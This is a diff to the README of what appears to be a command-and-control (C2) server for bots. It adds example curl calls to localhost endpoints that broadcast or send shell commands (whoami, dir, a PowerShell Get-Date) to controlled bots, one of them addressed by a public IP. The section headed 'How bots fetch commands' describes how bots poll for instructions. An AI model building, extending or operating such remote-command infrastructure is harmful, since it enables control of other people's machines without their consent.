@@ -153,6 +153,13 @@ c2/
 curl -X POST http://localhost:8080/sendcmd \
      -H "Content-Type: application/json" \
      -d '{"botid": "154.65.100.201", "cmd": "whoami"}'
+
+curl http://localhost:8080/heartbeat
+curl -X POST http://localhost:8080/runall -H "Content-Type: application/json" -d '{"cmd": "ps:Get-Date"}'
+curl -X POST http://localhost:8080/sendcmd -H "Content-Type: application/json" -d '{"botid": "MYBOT", "cmd": "dir"}'
+
+
+
 ```
 
 ---
@@ -166,7 +173,6 @@ curl -X POST http://localhost:8080/broadcast \
 ```
 
 ---
-
 ### 🤖 How bots fetch commands
 
 Each bot should make requests like:
